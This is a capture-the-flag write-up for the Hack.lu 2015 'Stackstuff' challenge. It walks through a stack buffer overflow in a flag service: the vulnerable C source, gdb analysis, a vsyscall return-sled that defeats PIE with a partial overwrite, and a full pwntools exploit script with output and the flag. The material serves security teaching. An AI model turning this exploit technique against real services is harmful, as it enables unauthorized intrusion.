{"componentChunkName":"component---src-templates-writeup-js","path":"/writeups/hack.lu-ctf-2015/exploiting/Stackstuff/sudhackar","result":{"pageContext":{"html":"<p><a href=\"ctf=hack.lu-2015\"></a>\n<a href=\"type=exploiting,pwn\"></a>\n<a href=\"tags=buffer-overflow\"></a>\n<a href=\"tools=gdb-peda,pwntools\"></a>\n<a href=\"techniques=ROP\"></a></p>\n<h1>Stackstuff (Exploiting 150)</h1>\n<p>We have an <a href=\"/8b5f46720cc8c931d03bb8a1c54ec22a/stackstuff_public_d7f6e7f394f649ba96b3113374a0bfb3.tar.gz\">archive</a>.\nOn extracting</p>\n<pre><code class=\"language-bash\">$ file *\nhackme:   ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=f46fbf9b159f6a1a31893faf7f771ca186a2ce8d, not stripped\nhackme.c: C source, ASCII text\n</code></pre>\n<p>We have source of the executable. </p>\n<pre><code class=\"language-c\">int check_password_correct(void) {\n  char buf[50] = {0};\n\n  puts(\"To download the flag, you need to specify a password.\");\n  printf(\"Length of password: \");\n  int inlen = 0;\n  if (scanf(\"%d\\n\", &#x26;inlen) != 1) {\n    // peer probably disconnected?\n    exit(0);\n  }\n  if (inlen &#x3C;= 0 || inlen > 50) {\n    // bad input length, fix it\n    inlen = 90;\n  }\n  if (fread(buf, 1, inlen, stdin) != inlen) {\n    // peer disconnected, stop\n    exit(0);\n  }\n  return strcmp(buf, real_password) == 0;\n}\n\n\nvoid require_auth(void) {\n  while (!check_password_correct()) {\n    puts(\"bad password, try again\");\n  }\n}\n\nvoid handle_request(void) {\n  alarm(60);\n  setbuf(stdout, NULL);\n\n  FILE *realpw_file = fopen(\"password\", \"r\");\n  if (realpw_file == NULL || fgets(real_password, sizeof(real_password), realpw_file) == NULL) {\n    fputs(\"unable to read real_password\\n\", stderr);\n    exit(0);\n  }\n  fclose(realpw_file);\n\n  puts(\"Hi! This is the flag download service.\");\n  require_auth();\n\n  char flag[50]; //we'll jump to this line in the exploit ;)\n  FILE *flagfile = fopen(\"flag\", \"r\");\n  if (flagfile == NULL || fgets(flag, sizeof(flag), flagfile) == NULL) {\n    fputs(\"unable to read flag\\n\", stderr);\n    exit(0);\n  }\n  puts(flag);\n}\n</code></pre>\n<p>We can see that it is basic buffer overflow in check_password_correct as it allows an input of length 90 in a buffer of 50.\nSo we load the executable in gdb.</p>\n<pre><code class=\"language-bash\">gdb-peda$ checksec\nCANARY    : disabled\nFORTIFY   : disabled\nNX        : ENABLED\nPIE       : ENABLED\nRELRO     : disabled\n</code></pre>\n<p>NX is enabled means stack is not executable.\nPIE means position independent executable, This means that the binary instructions itself is loaded arbitrarily in the memory.\nSo we can't have shellcode and normal ROP over the binary.</p>\n<p>However we have an attack vector where we can fool the service to jump to the part where it displays the flag. But we need to have knowledge of the eip or some instruction address in memory.</p>\n<p>So lets find the offset of EIP overwrite and search for some attack vectors.\nUse pattern_create and pattern_offset to find that the offset is 72.</p>\n<p>So payload:</p>\n<blockquote>\n<p>'A'*72+ret_addr</p>\n</blockquote>\n<p>Lets test in gdb. For PIE enabled executables gdb uses a fixed address to load them which can be found out by running and stopping it in gdb using 'info files'</p>\n<pre><code class=\"language-bash\">$ nc 127.0.0.1 1514 -vv\nlocalhost [127.0.0.1] 1514 (?) open\nHi! This is the flag download service.\nTo download the flag, you need to specify a password.\nLength of password: 99\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBB\n</code></pre>\n<p>gives us</p>\n<pre><code class=\"language-bash\">gdb-peda$  b *0x555555554fb9\nBreakpoint 1 at 0x555555554fb9\ngdb-peda$ r\n.\n.\n.\n[Switching to process 2398]\n[----------------------------------registers-----------------------------------]\nRAX: 0x0 \nRBX: 0x0 \nRCX: 0xa ('\\n')\nRDX: 0x73 ('s')\nRSI: 0x555555755a20 (\"sudhackar\\n\")\nRDI: 0x7fffffffe0d0 ('A' &#x3C;repeats 72 times>, 'B' &#x3C;repeats 18 times>, \"UUUU\")\nRBP: 0x0 \nRSP: 0x7fffffffe118 ('B' &#x3C;repeats 18 times>, \"UUUU\")\nRIP: 0x555555554fb9 (&#x3C;check_password_correct+231>:  ret)\nR8 : 0x1000 \nR9 : 0x4141414141414141 ('AAAAAAAA')\nR10: 0x4141414141414141 ('AAAAAAAA')\nR11: 0x246 \nR12: 0x555555554d70 (&#x3C;_start>:  xor    ebp,ebp)\nR13: 0x7fffffffe2c0 --> 0x1 \nR14: 0x0 \nR15: 0x0\nEFLAGS: 0x206 (carry PARITY adjust zero sign trap INTERRUPT direction overflow)\n[-------------------------------------code-------------------------------------]\n   0x555555554faf &#x3C;check_password_correct+221>: sete   al\n   0x555555554fb2 &#x3C;check_password_correct+224>: movzx  eax,al\n   0x555555554fb5 &#x3C;check_password_correct+227>: add    rsp,0x58\n=> 0x555555554fb9 &#x3C;check_password_correct+231>: ret    \n   0x555555554fba &#x3C;require_auth>:   sub    rsp,0x8\n   0x555555554fbe &#x3C;require_auth+4>: jmp    0x555555554fcc &#x3C;require_auth+18>\n   0x555555554fc0 &#x3C;require_auth+6>: lea    rdi,[rip+0x420]        # 0x5555555553e7\n   0x555555554fc7 &#x3C;require_auth+13>:    call   0x555555554bc0 &#x3C;puts@plt>\n[------------------------------------stack-------------------------------------]\n0000| 0x7fffffffe118 ('B' &#x3C;repeats 18 times>, \"UUUU\")\n0008| 0x7fffffffe120 (\"BBBBBBBBBBUUUU\")\n0016| 0x7fffffffe128 --> 0x555555554242 ('BBUUUU')\n0024| 0x7fffffffe130 --> 0x555555554d70 (&#x3C;_start>:  xor    ebp,ebp)\n0032| 0x7fffffffe138 --> 0x7ffff7df0325 (&#x3C;_dl_runtime_resolve+53>:  mov    r11,rax)\n0040| 0x7fffffffe140 --> 0x7fffffffe57f --> 0x5800636578656572 ('reexec')\n0048| 0x7fffffffe148 --> 0x0 \n0056| 0x7fffffffe150 --> 0x7fffffffe2d8 --> 0x7fffffffe586 (\"XDG_VTNR=7\")\n[------------------------------------------------------------------------------]\nLegend: code, data, rodata, value\n\nBreakpoint 1, 0x0000555555554fb9 in check_password_correct ()\n</code></pre>\n<p>So we have EIP overwrite here. But we can't figure out the ret_addr.\nHowever If we notice the stack frame here on ret instruction above.\nWe see </p>\n<pre><code>0016| 0x7fffffffe128 --> 0x555555554242 ('BBUUUU')\n</code></pre>\n<p>We control the last two bytes of an address which matches with our randomised EIP. So now we have to use this address some how to return to this location.</p>\n<p>We can use the linux vsyscall function as its location is always fixed for a binary.\nThe vsyscalls are part of the kernel, but the kernel pages containing them are executable with userspace privileges. And theyâ€™re mapped to fixed addresses in the virtual memory</p>\n<p>Now we'll look for potential ROP chains.</p>\n<pre><code class=\"language-bash\">gdb-peda$ x/5xi 0xffffffffff600400\n   0xffffffffff600400:  mov    rax,0xc9\n   0xffffffffff600407:  syscall \n   0xffffffffff600409:  ret    \n   0xffffffffff60040a:  int3   \n   0xffffffffff60040b:  int3\n</code></pre>\n<p>Yea, ret is all we need,twice!\nSo now payload format :</p>\n<blockquote>\n<p>'A'*72+p64(0xffffffffff600400)+p64(0xffffffffff600400)+last two bytes of our jmp address.</p>\n</blockquote>\n<p><a href=\"/3b39523c820a736ef85fe71e3227d655/stackstuff.py\">Here</a> is an exploit that does the same.</p>\n<pre><code class=\"language-python\">from pwn import *\n#s=remote('127.0.0.1',1514)\n#0x000055555555508b\n#0xffffffffff600400\ns=remote('school.fluxfingers.net',1514)\naddr=p64(0xffffffffff600400)\npayload='A'*72+addr*2+\"\\x8b\\x10\"\nprint repr(payload)\nprint s.recv(100,timeout=1)\nprint s.recv(100,timeout=1)\nprint s.recv(100,timeout=1)\nprint s.recv(100,timeout=1)\ns.send('100\\n')\nprint s.recvline(timeout=1)\nprint s.recvline(timeout=1)\ns.send(payload+'\\n')\nfor _ in range(10):\n    try:\n        print s.recv(100,timeout=1)\n    except:\n        print \"Done?\"\n        break\n</code></pre>\n<p>Afer a few tries</p>\n<pre><code class=\"language-bash\">$ python stackstuff_public_d7f6e7f394f649ba96b3113374a0bfb3/try.py [+] Opening connection to school.fluxfingers.net on port 1514: Done\n'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\\x00\\x04`\\xff\\xff\\xff\\xff\\xff\\x00\\x04`\\xff\\xff\\xff\\xff\\xff\\x8b\\x10'\nHi! This is the flag download service.\n\nTo download the flag, you need to specify a password.\nLength of password: \n\n\n\n\nflag{MoRE_REtuRnY_tHAn_rop}\n\n\nDone?\n[*] Closed connection to school.fluxfingers.net port 1514\n</code></pre>\n<p>Flag: </p>\n<blockquote>\n<p>flag{MoRE_REtuRnY_tHAn_rop}</p>\n</blockquote>","relativePath":"writeups/hack.lu-ctf-2015/exploiting/Stackstuff/sudhackar"}}}